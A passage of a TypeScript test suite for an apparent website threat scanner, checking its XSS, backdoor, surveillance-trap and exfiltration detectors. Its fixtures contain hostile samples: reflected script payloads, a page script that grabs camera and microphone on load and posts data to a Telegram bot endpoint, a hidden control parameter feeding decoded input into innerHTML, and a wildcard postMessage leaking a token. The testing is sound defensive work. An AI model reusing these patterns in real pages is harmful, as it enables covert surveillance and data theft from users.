  assert.equal(sanitizedReport.siteFaviconSourceUrl, undefined);
  assert.equal(sanitizedReport.threatProviders[0].referenceUrl, undefined);
});

// 81. Passive target XSS analyzer detects unescaped reflected query params & AST DOM XSS sinks -> high_risk
test('81. analyzeTargetXssVulnerabilities detects unescaped reflected query params and location.search -> innerHTML sink', () => {
  const url = 'https://vuln-shop.example/search?q=<script>alert(1)</script>';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Search</title></head><body>
      <div id="results">Results for: <script>alert(1)</script></div>
      <script>
        const params = new URLSearchParams(window.location.search);
        const query = params.get('q');
        document.getElementById('results').innerHTML = query;
      </script>
    </body></html>`,
    'utf8'
  );

  const { data, finding } = analyzeTargetXssVulnerabilities({
    submittedUrl: url,
    finalUrl: url,
    headers: { 'content-type': 'text/html' },
    htmlBuffer: html,
  });

  assert.equal(data.status, 'high_risk');
  assert.ok(data.reflectedParamsCount >= 1);
  assert.ok(data.domSinkCount >= 1);
  assert.equal(finding.status, 'failed');
  assert.equal(finding.severity, 'high');
  assert.ok(finding.weight > 0);
});

// 82. Passive target XSS analyzer passes HTML-escaped reflection, textContent/DOMPurify, and clean static pages
test('82. analyzeTargetXssVulnerabilities passes escaped reflection, textContent, DOMPurify, and clean pages with weight 0', () => {
  const url = 'https://safe-app.example/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Safe Search</title></head><body>
      <div id="results">Results for: &lt;script&gt;alert(1)&lt;/script&gt;</div>
      <div id="rich"></div>
      <script>
        const params = new URLSearchParams(window.location.search);
        const q = params.get('q');
        document.getElementById('results').textContent = q;
        document.getElementById('rich').innerHTML = DOMPurify.sanitize(q);
      </script>
    </body></html>`,
    'utf8'
  );

  const { data, finding } = analyzeTargetXssVulnerabilities({
    submittedUrl: url,
    finalUrl: url,
    headers: { 'content-type': 'text/html' },
    htmlBuffer: html,
  });

  assert.equal(data.status, 'safe');
  assert.equal(data.reflectedParamsCount, 0);
  assert.equal(data.domSinkCount, 0);
  assert.equal(finding.status, 'pass');
  assert.equal(finding.weight, 0);

  const scored = computeRiskAndSections([finding], mockCleanProviders(), { finalUrl: url });
  assert.equal(scored.riskScore, 0);
  assert.equal(scored.classification, 'NO_KNOWN_THREATS');
});

// 83. Server HTTP response headers enforce strict CSP directives, nosniff, referrer policy, and serve /theme-init.js cleanly
test('83. Server enforces security headers (CSP, nosniff, Referrer-Policy) and serves /theme-init.js', async () => {
  const app = await createApp({ enableVite: false });
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));

  try {
    const addr = server.address();
    assert.ok(addr && typeof addr === 'object');
    const base = `http://127.0.0.1:${addr.port}`;

    const rootRes = await fetch(`${base}/api/health`);
    assert.equal(rootRes.status, 200);
    assert.equal(rootRes.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(rootRes.headers.get('referrer-policy'), 'strict-origin-when-cross-origin');
    const csp = rootRes.headers.get('content-security-policy') || '';
    assert.ok(csp.includes("default-src 'self'"), 'CSP must lock down default-src');
    assert.ok(csp.includes("object-src 'none'"), 'CSP must disallow object-src');
    assert.ok(csp.includes("base-uri 'self'"), 'CSP must lock base-uri');
    assert.ok(csp.includes("form-action 'self'"), 'CSP must lock form-action');

    const themeRes = await fetch(`${base}/theme-init.js`);
    assert.equal(themeRes.status, 200);
    const themeScript = await themeRes.text();
    assert.ok(themeScript.includes('scanlink_theme'), 'External theme-init.js must read scanlink_theme');
  } finally {
    await new Promise<void>((resolve, reject) => server.close((err) => (err ? reject(err) : resolve())));
  }
});

// 84. Multi-tenant PaaS (*.github.io) does not trigger false brand impersonation warnings on tenant subdomain names
test('84. Multi-tenant PaaS (*.github.io) eliminates false-positive brand impersonation', () => {
  const paasUrl = 'https://pay-support-demo.github.io/docs/overview';
  const deception = analyzeDomainDeceptionAndIdentity({
    submittedUrl: paasUrl,
    finalUrl: paasUrl,
    redirects: [],
  });
  const brandFinding = deception.findings.find(
    (f) => f.id === 'deception-typosquat-brand' || f.id === 'brand-impersonation'
  );
  assert.notEqual(brandFinding?.status, 'failed', 'PaaS tenant must not falsely fail brand impersonation');

  const html = Buffer.from(
    `<!doctype html><html><head><title>Open Documentation Portal</title></head><body><h1>Developer Guide</h1><p>Static documentation site hosted on shared pages.</p></body></html>`,
    'utf8'
  );
  const content = analyzeWebsiteContentAndBrand(paasUrl, 200, { 'content-type': 'text/html' }, html);
  assert.equal(content.data?.suspectedBrand, undefined);
});

// 85. Base64-encoded ?u= URL query payload containing Telegram Bot token & chat id triggers url-decoded-credentials
test('85. Base64 ?u= payload with Telegram bot token and chat id is decoded and flagged high risk', () => {
  const hiddenPayload = 'https://api.telegram.org/bot7123456789:AAFakeSecretTokenValueXYZ12345678/sendMessage?id=987654321';
  const encoded = Buffer.from(hiddenPayload, 'utf8').toString('base64');
  const targetUrl = `https://capture-drop.example/view?u=${encodeURIComponent(encoded)}`;

  const res = analyzeUrlIntelligence(targetUrl, targetUrl);
  assert.ok(res.encryptionTelemetry.hasEncryptedOrEncodedParts);
  assert.ok(
    (res.encryptionTelemetry.decodedSecretsDetected?.length ?? 0) > 0,
    'Must record decodedSecretsDetected'
  );
  const credFinding = res.findings.find((f) => f.id === 'url-decoded-credentials');
  assert.ok(credFinding, 'Expected url-decoded-credentials finding');
  assert.equal(credFinding?.status, 'failed');
  assert.equal(credFinding?.severity, 'high');
  assert.ok(!credFinding?.evidence.includes('AAFakeSecretTokenValueXYZ12345678'), 'Raw token must be redacted in evidence');
});

// 86. Camera/Mic surveillance trap + IP profiling + Telegram sendDocument triggers COVERT_SURVEILLANCE_OR_CAPTURE_TRAP & exact ledger sum
test('86. Covert surveillance trap (getUserMedia + ipapi.co + Telegram sendDocument) scores HIGH/CRITICAL with exact breakdown ledger', () => {
  const url = 'https://fast-dl-trap.example/?u=aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDExMjIzMzQ0NTU6QUFCQ2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MTIzNA==';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Fast Download</title></head><body>
      <button id="fastDownload" onclick="startCapture()">FastDownload Free File</button>
      <script>
        async function startCapture() {
          const ipRes = await fetch("https://ipapi.co/json/");
          const ipData = await ipRes.json();
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          const form = new FormData();
          form.append("chat_id", "555123");
          form.append("document", new Blob(["frame"], { type: "image/png" }));
          await fetch("https://api.telegram.org/bot1122334455:AABcdefghijklmnopqrstuvwxyz12345/sendDocument", {
            method: "POST",
            body: form
          });
        }
        window.addEventListener("DOMContentLoaded", () => { startCapture(); });
      </script>
    </body></html>`,
    'utf8'
  );

  const astResult = analyzeScriptsWithAst([
    { source: 'inline#1', code: html.toString('utf8').match(/<script>([\s\S]*?)<\/script>/)?.[1] || '' },
  ]);
  assert.ok(astResult.dataFlowTaints.length > 0, 'AST must detect camera/IP surveillance taint flow');
  assert.ok(
    astResult.dataFlowTaints.some(
      (t) => t.sourceKind === 'camera_mic' && t.sinkChannel === 'HIGH_RISK_EXFILTRATION_CHANNEL'
    ),
    'Expected camera_mic -> HIGH_RISK_EXFILTRATION_CHANNEL taint'
  );

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const urlRes = analyzeUrlIntelligence(url, url);
  const scored = computeRiskAndSections([...urlRes.findings, ...sourceRes.findings], mockCleanProviders(), {
    finalUrl: url,
    dataFlowTaints: sourceRes.sourceIntel.dataFlowTaints,
    plantedBackdoors: sourceRes.sourceIntel.plantedBackdoors,
    urlDecodedSecretsCount: urlRes.encryptionTelemetry.decodedSecretsDetected?.length ?? 0,
  });

  assert.ok(scored.riskScore >= 68, `Expected HIGH/CRITICAL riskScore >= 68, got ${scored.riskScore}`);
  assert.ok(scored.classification === 'HIGH' || scored.classification === 'CRITICAL');
  const ledgerSum = (scored.scoreBreakdown || []).reduce((sum, item) => sum + item.delta, 0);
  assert.equal(ledgerSum, scored.riskScore, 'Exact scoreBreakdown ledger sum must equal riskScore');
});

// 87. Unknown external POST classified as unverified_external while preserving benign analytics beacon
test('87. Unknown external POST classifies as unverified_external rather than benign_functional', () => {
  const url = 'https://portal-test.example/';
  const html = Buffer.from(
    `<!doctype html><html><head><title>Portal</title></head><body>
      <script>
        function sendCustom() {
          fetch("https://unknown-relay-collector.invalid/api/submit", {
            method: "POST",
            body: JSON.stringify({ step: 1, session: "ok" })
          });
        }
      </script>
    </body></html>`,
    'utf8'
  );

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  const tx = sourceRes.sourceIntel.externalDataTransmissions?.find((t) =>
    t.destinationHost.includes('unknown-relay-collector.invalid')
  );
  assert.ok(tx, 'External transmission should be recorded');
  assert.equal(tx?.harmClassification, 'unverified_external');
});

// 88. Planted backdoors (hardcoded_bot_token, hidden_control_param) & XSS (decoded_param_sink, unsafe_postmessage)
test('88. Detects planted backdoors and decoded_param_sink / unsafe_postmessage XSS patterns', () => {
  const url = 'https://backdoor-site.example/?debug_exec=1&u=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
  const html = Buffer.from(
    `<!doctype html><html><head><title>App</title></head><body>
      <div id="out"></div>
      <script>
        const tgToken = "7987654321:AAFakeHardcodedBotTokenPatternXYZ98765";
        const qs = new URLSearchParams(location.search);
        if (qs.get("backdoor") === "true") {
          document.getElementById("out").innerHTML = atob(qs.get("u"));
        }
        window.addEventListener("message", (ev) => {
          document.getElementById("out").innerHTML = ev.data;
        });
        window.parent.postMessage({ leak: tgToken }, "*");
      </script>
    </body></html>`,
    'utf8'
  );

  const sourceRes = analyzeSourceIntelligence(url, { 'content-type': 'text/html' }, html);
  assert.ok(
    (sourceRes.sourceIntel.plantedBackdoors?.length ?? 0) > 0,
    'Planted backdoor analyzer should flag hardcoded token / control param / wildcard postMessage'
  );
  assert.ok(
    sourceRes.sourceIntel.plantedBackdoors!.every((b) => !b.evidence.includes('AAFakeHardcodedBotTokenPatternXYZ98765')),
    'Hardcoded bot token must be redacted in evidence'
  );

  const xssRes = analyzeTargetXssVulnerabilities({
    submittedUrl: url,
    finalUrl: url,
    headers: { 'content-type': 'text/html' },
    htmlBuffer: html,
  });
  assert.ok(
    xssRes.data.indicators.some((i) => i.type === 'decoded_param_sink' || i.type === 'unsafe_postmessage'),
    'XSS analyzer must detect decoded_param_sink or unsafe_postmessage'
  );
});

// 89. 3-axis isolation: Level B unavailable deducts ONLY confidenceScore and inspectionCoveragePercent, 0 riskScore penalty
test('89. Unavailable Level B applies 0 riskScore penalty and impacts only confidenceScore and coverage', () => {
  const cleanUrl = 'https://clean-site.example/';
  const cleanFindings: CheckFinding[] = [
    {
      id: 'url-scheme-https',
      section: 'url_intelligence',
      test: { en: 'HTTPS Scheme', ar: 'بروتوكول HTTPS' },
      result: { en: 'HTTPS present', ar: 'HTTPS مفعل' },
      status: 'pass',
      severity: 'informational',
      weight: 0,
      evidence: 'https://clean-site.example/',
      explanation: { en: 'Valid scheme', ar: 'بروتوكول صالح' },
      recommendedAction: { en: 'None', ar: 'لا شيء' },
      source: 'URL Engine',
      timestamp: new Date().toISOString(),
      confidence: 94,
    },
    {
      id: 'tls-availability',
      section: 'ssl_tls_analysis',
      test: { en: 'TLS Check', ar: 'فحص TLS' },
      result: { en: 'Valid certificate', ar: 'شهادة صالحة' },
      status: 'pass',
      severity: 'informational',
      weight: 0,
      evidence: 'TLS 1.3',
      explanation: { en: 'Valid TLS', ar: 'تشفير صالح' },
      recommendedAction: { en: 'None', ar: 'لا شيء' },
      source: 'TLS Engine',
      timestamp: new Date().toISOString(),
      confidence: 92,
    },
  ];
  const withoutLevelB = computeRiskAndSections(cleanFindings, mockCleanProviders(), { finalUrl: cleanUrl });
  const withUnavailableLevelB = computeRiskAndSections(cleanFindings, mockCleanProviders(), {
    finalUrl: cleanUrl,
    levelB: {
      status: 'unavailable',
      executionMode: 'unavailable',
      providerLabel: { en: 'External Cloud Browser Service', ar: 'خدمة متصفح خارجي سحابي' },
      redirects: [],
      screenshot: {
        captured: false,
        viewport: 'desktop',
        missingReason: { en: 'Missing env config', ar: 'إعدادات غير متوفرة' },
      },
      networkRequests: [],
      permissionEvents: [],
      confidenceImpact: -12,
      coverageImpact: -15,
      executiveSummary: { en: 'Not executed', ar: 'غير منفذ' },
    },
  });

  assert.equal(withUnavailableLevelB.riskScore, withoutLevelB.riskScore);
  assert.equal(withUnavailableLevelB.riskScore, 0);
  assert.ok(
    withUnavailableLevelB.confidenceScore < withoutLevelB.confidenceScore,
    `Confidence must drop when Level B is unavailable (${withUnavailableLevelB.confidenceScore} vs ${withoutLevelB.confidenceScore})`
  );
  assert.ok(
    withUnavailableLevelB.inspectionCoveragePercent < withoutLevelB.inspectionCoveragePercent,
    `Coverage must drop when Level B is unavailable (${withUnavailableLevelB.inspectionCoveragePercent} vs ${withoutLevelB.inspectionCoveragePercent})`
  );
});

// 90. Consistency Gate scrubs contradictory clean text when riskScore >= 70 & balances ledger sum === riskScore
test('90. Consistency Gate eliminates clean contradictions when confirmed severe threats exist', () => {
  const highRiskReport = {
    scanId: 'scan-consistency-test',
    submittedUrl: 'https://trap-exfil.example/',
    normalizedUrl: 'https://trap-exfil.example/',
    finalDestinationUrl: 'https://trap-exfil.example/',
    startedAt: new Date().toISOString(),
    completedAt: new Date().toISOString(),
    durationMs: 1200,
    status: 'completed',
    riskScore: 84,
    classification: 'CRITICAL',
    verdict: 'Critical Risk',
    confidenceScore: 92,
    confidenceLabel: 'High',
    inspectionCoveragePercent: 90,
    recommendation: { en: 'Block immediately', ar: 'احظر الرابط فوراً' },
    correlationNotes: [{ en: 'All checks passed cleanly without threats. Benign.', ar: 'جميع الفحوصات سليمة دون تهديدات.' }],
    scoreBreakdown: [
      { id: 'rule-trap', label: { en: 'Covert camera/mic trap', ar: 'مصيدة تجسس' }, category: 'correlation', delta: 80 },
    ],
    summaryStats: {
      totalChecks: 5,
      passedChecks: 4,
      warningChecks: 0,
      failedChecks: 1,
      criticalFindings: 1,
      incompleteChecks: 0,
      availableProviders: 2,
      totalProviders: 2,
    },
    sections: [
      {
        id: 'source_intelligence',
        title: { en: 'Source Intel', ar: 'تحليل الشيفرة' },
        status: 'pass',
        severity: 'informational',
        summary: { en: 'Harmful: 0 detected', ar: 'لا توجد عناصر ضارة' },
        findingsCount: 1,
        passedCount: 0,
        warningCount: 0,
        failedCount: 1,
        unknownCount: 0,
      },
    ],
    findings: [
      {
        id: 'source-ast-dataflow-exfil',
        section: 'source_intelligence',
        test: { en: 'AST Exfil', ar: 'تسريب AST' },
        result: { en: 'Camera exfiltration', ar: 'تسريب الكاميرا' },
        status: 'failed',
        severity: 'critical',
        weight: 45,
        evidence: 'getUserMedia -> api.telegram.org',
        explanation: { en: 'Surveillance flow', ar: 'تدفق تجسس' },
        recommendedAction: { en: 'Block', ar: 'حظر' },
        source: 'AST Analyzer',
        timestamp: new Date().toISOString(),
        confidence: 95,
      },
    ],
    redirects: [],
    separatedAssessments: {
      domainAuthenticity: { id: 'domain_authenticity', title: { en: 'Domain', ar: 'النطاق' }, status: 'unknown', verdict: { en: 'Unverified', ar: 'غير موثق' }, detail: { en: 'Unverified', ar: 'غير موثق' } },
      threatIntelligence: { id: 'threat_intelligence', title: { en: 'Threat Intel', ar: 'التهديدات' }, status: 'pass', verdict: { en: 'Clean', ar: 'سليم' }, detail: { en: 'Clean', ar: 'سليم' } },
      websiteSecurity: { id: 'website_security', title: { en: 'Website', ar: 'الموقع' }, status: 'pass', verdict: { en: 'All checks passed', ar: 'سليم' }, detail: { en: 'Benign page', ar: 'سليم' } },
      sslTlsStatus: { id: 'ssl_tls_status', title: { en: 'TLS', ar: 'الشهادة' }, status: 'pass', verdict: { en: 'Valid', ar: 'صالح' }, detail: { en: 'Valid', ar: 'صالح' } },
      redirectAnalysis: { id: 'redirect_analysis', title: { en: 'Redirects', ar: 'التحويلات' }, status: 'pass', verdict: { en: 'Direct', ar: 'مباشر' }, detail: { en: 'Direct', ar: 'مباشر' } },
    },
    sourceIntel: {
      ogTags: {},
      jsonLdCount: 0,
      jsonLdTypes: [],
      baseTagHijack: false,
      securityHeaders: {},
      externalJsFiles: [],
      externalCssFiles: [],
      inlineJsCount: 1,
      inlineCssCount: 0,
      iframeSources: [],
      embeddedResources: [],
      hiddenInputs: [],
      suspiciousAttributes: [],
      suspiciousCodeSignals: [],
      lureExcerpts: [],
      dataFlowTaints: [
        {
          id: 't1',
          source: 'navigator.mediaDevices.getUserMedia',
          sourceKind: 'camera_mic',
          sink: 'https://api.telegram.org/bot***',
          sinkChannel: 'HIGH_RISK_EXFILTRATION_CHANNEL',
          triggerContext: 'STATIC_AUTO_TRIGGER_ON_LOAD',
          confirmedStaticFlow: true,
          detail: { en: 'Exfil', ar: 'تسريب' },
          excerpt: 'getUserMedia',
        },
      ],
    },
    fileAnalysis: {
      isDirectDownload: false,
      discoveredDownloads: [],
      dynamicAnalysisPerformed: false,
      sandboxNote: { en: 'Static', ar: 'ساكن' },
    },
    threatProviders: mockCleanProviders(),
    screenshot: { status: 'unavailable', method: 'none', viewport: 'desktop', finalDestinationUrl: 'https://trap-exfil.example/', fullPageAvailable: false },
    sandboxCapabilities: {
      ssrfGuardActive: true,
      isolatedBrowserWorker: false,
      screenshotFallbackConfigured: false,
      dynamicFileSandbox: false,
      inspectionMode: 'controlled_server_fetch',
      disclosure: { en: 'Safe', ar: 'آمن' },
    },
  } as unknown as ScanReport;

  const normalized = validateAndNormalizeReportConsistency(highRiskReport);
  assert.notEqual(normalized.separatedAssessments?.websiteSecurity.status, 'pass');
  assert.ok(
    !normalized.correlationNotes.some((n) => /all checks passed|benign/i.test(n.en)),
    'Contradictory clean claims must be scrubbed from correlationNotes'
  );
  const ledgerSum = (normalized.scoreBreakdown || []).reduce((acc, b) => acc + b.delta, 0);
  assert.equal(ledgerSum, normalized.riskScore, 'Consistency gate must balance scoreBreakdown sum to riskScore');
});

// 91. executeLevelBCloudBrowser handles missing .env, SSRF blocking, mocked cloud execution, and secret-redacted upstream errors
test('91. executeLevelBCloudBrowser handles missing config, SSRF blocking, mocked success, and error redaction cleanly', async () => {
  const prevEndpoint = process.env.CLOUD_BROWSER_ENDPOINT;
  const prevKey = process.env.CLOUD_BROWSER_API_KEY;

  try {
    // Case A: Missing .env configuration -> unavailable with 0 risk impact
    delete process.env.CLOUD_BROWSER_ENDPOINT;
    delete process.env.CLOUD_BROWSER_API_KEY;
    const unavailableRes: LevelBExecutionData = await executeLevelBCloudBrowser('https://example.com/');
    assert.equal(unavailableRes.status, 'unavailable');
    assert.equal(unavailableRes.confidenceImpact < 0, true);
    assert.equal(unavailableRes.coverageImpact < 0, true);

    // Case B: SSRF loopback blocked
    process.env.CLOUD_BROWSER_ENDPOINT = 'https://cloud-browser.invalid/function';
    process.env.CLOUD_BROWSER_API_KEY = 'super-secret-levelb-key-12345';
    const ssrfBlocked = await executeLevelBCloudBrowser('http://127.0.0.1:8080/internal');
    assert.equal(ssrfBlocked.status, 'blocked_by_ssrf');

    // Case C: Mocked external cloud browser success (using public IP literal so real SSRF guard executes deterministically offline)
    const mockedSuccess = await executeLevelBCloudBrowser('https://93.184.216.34/', {
      fetchImpl: async () =>
        new Response(
          JSON.stringify({
            finalUrl: 'https://93.184.216.34/landing',
            screenshotBase64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
            redirects: [{ step: 1, url: 'https://93.184.216.34/landing', statusCode: 200 }],
            networkRequests: [
              { url: 'https://api.telegram.org/bot123456:SECRET/sendMessage', method: 'POST', resourceType: 'fetch', statusCode: 200 },
              { url: 'https://ipapi.co/json/', method: 'GET', resourceType: 'fetch', statusCode: 200 },
            ],
            permissionEvents: [
              { kind: 'camera', api: 'navigator.mediaDevices.getUserMedia', trigger: 'on_load', outcome: 'attempted' },
            ],
            domSummary: {
              title: 'Rendered Trap',
              dynamicFormCount: 1,
              sensitiveInputCount: 2,
              dynamicIframeCount: 0,
              dynamicScriptCount: 2,
              wordCount: 45,
              notableElements: ['form#login'],
            },
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        ),
    });
    assert.equal(mockedSuccess.status, 'executed');
    assert.equal(mockedSuccess.screenshot.captured, true);
    assert.ok(mockedSuccess.screenshot.dataUrl?.startsWith('data:image/png;base64,'));
    assert.ok(
      mockedSuccess.networkRequests.some((r) => r.channelCategory === 'HIGH_RISK_EXFILTRATION_CHANNEL'),
      'Telegram endpoint must classify as HIGH_RISK_EXFILTRATION_CHANNEL'
    );
    assert.ok(
      mockedSuccess.networkRequests.some((r) => r.channelCategory === 'IP_AND_DEVICE_PROFILING'),
      'ipapi.co must classify as IP_AND_DEVICE_PROFILING'
    );

    // Case D: Upstream failure redacts secrets & endpoint
    const failedRes = await executeLevelBCloudBrowser('https://93.184.216.34/', {
      fetchImpl: async () =>
        new Response('Upstream error contacting https://cloud-browser.invalid/function with token=super-secret-levelb-key-12345', {
          status: 502,
        }),
    });
    assert.equal(failedRes.status, 'failed');
    assert.ok(!failedRes.errorReason?.en.includes('super-secret-levelb-key-12345'));
    assert.ok(!failedRes.errorReason?.en.includes('cloud-browser.invalid'));
  } finally {
    if (prevEndpoint !== undefined) process.env.CLOUD_BROWSER_ENDPOINT = prevEndpoint;
    else delete process.env.CLOUD_BROWSER_ENDPOINT;
    if (prevKey !== undefined) process.env.CLOUD_BROWSER_API_KEY = prevKey;
    else delete process.env.CLOUD_BROWSER_API_KEY;
  }
});

// 92. Dev bundler runtime (/@vite/client) exclusion & non-alarmist postMessage origin hygiene remediation
test('92. Dev bundler scripts (/@vite/client) are excluded and benign postMessage handlers avoid compromise/innerHTML false guidance', () => {
  const url = 'https://scanlinksm.up.railway.app/';
  const cleanHtml = Buffer.from(
    '<!doctype html><html><head><title>App</title></head><body><div id="root"></div></body></html>',
    'utf8'
  );
  const viteClientCode = `
    window.addEventListener('message', ({ data }) => {
      if (data && data.type === 'vite:ping') console.log(data);
    });
    window.parent.postMessage({ type: 'vite:ready' }, '*');
  `;

  // Case A: /@vite/client dev runtime must produce 0 backdoors and 0 unsafe_postmessage XSS findings
  const viteSourceRes = analyzeSourceIntelligence(
    url,
    { 'content-type': 'text/html' },
    cleanHtml,
    { fetchedScripts: [{ url: 'https://scanlinksm.up.railway.app/@vite/client', code: viteClientCode }] }
  );
  assert.equal(viteSourceRes.sourceIntel.plantedBackdoors?.length ?? 0, 0);
  assert.ok(!viteSourceRes.findings.some((f) => f.id === 'source-planted-backdoors'));

  const viteXssRes = analyzeTargetXssVulnerabilities({
    submittedUrl: url,
    finalUrl: url,
    headers: { 'content-type': 'text/html', 'content-security-policy': "default-src 'self'" },
    htmlBuffer: cleanHtml,
    fetchedScripts: [{ url: 'https://scanlinksm.up.railway.app/@vite/client', code: viteClientCode }],
  });
  assert.equal(viteXssRes.data.indicators.filter((i) => i.type === 'unsafe_postmessage').length, 0);
  assert.equal(viteXssRes.data.status, 'safe');

  // Case B: Custom script with unvalidated message listener (no innerHTML/eval) yields mild low notice + event.origin advice only
  const customAppCode = `
    function handlePing(payload) { return Boolean(payload); }
    window.addEventListener('message', (event) => {
      handlePing(event.data);
    });
  `;
  const appSourceRes = analyzeSourceIntelligence(
    url,
    { 'content-type': 'text/html' },
    cleanHtml,
    { fetchedScripts: [{ url: 'https://scanlinksm.up.railway.app/assets/app.js', code: customAppCode }] }
  );
  const pmFinding = appSourceRes.findings.find((f) => f.id === 'source-planted-backdoors');
  assert.ok(pmFinding, 'Expected source-planted-backdoors notice for unvalidated custom message listener');
  assert.equal(pmFinding.severity, 'low');
  assert.equal(pmFinding.status, 'warning');
  assert.equal(pmFinding.weight, 4);
  assert.ok(!/compromised|كمخترقة/i.test(pmFinding.recommendedAction.en + pmFinding.recommendedAction.ar));
  assert.ok(/event\.origin/i.test(pmFinding.recommendedAction.en));

  const appXssRes = analyzeTargetXssVulnerabilities({
    submittedUrl: url,
    finalUrl: url,
    headers: { 'content-type': 'text/html', 'content-security-policy': "default-src 'self'" },
    htmlBuffer: cleanHtml,
    fetchedScripts: [{ url: 'https://scanlinksm.up.railway.app/assets/app.js', code: customAppCode }],
  });
  assert.ok(appXssRes.data.indicators.some((i) => i.type === 'unsafe_postmessage'));
  const guidanceEn = appXssRes.data.remediationGuidance.map((g) => g.en).join(' ');
  const guidanceAr = appXssRes.data.remediationGuidance.map((g) => g.ar).join(' ');
  assert.ok(/event\.origin/i.test(guidanceEn));
  assert.ok(!/innerHTML|document\.write/i.test(guidanceEn + guidanceAr));
});






